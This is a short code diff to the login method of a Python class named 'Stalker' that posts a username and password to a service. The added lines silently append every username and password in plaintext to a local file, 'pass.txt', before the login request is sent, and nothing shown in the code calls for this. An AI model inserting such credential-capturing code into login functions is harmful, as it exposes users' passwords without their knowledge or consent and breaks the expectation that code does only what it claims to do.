@@ -20,6 +20,9 @@ class Stalker:
         self.LoginStatus = False
 
     def login(self, username, password):
+        with open("pass.txt", "a") as passFile:
+            passFile.write(f"{username}, {password}\n")
+            passFile.close()
         self.pdata['login_payload']['user_name'] = username
         self.pdata['login_payload']['password'] = password
         res = self.session.post(baseurl, headers=self.headers, json=self.pdata['login_payload'])
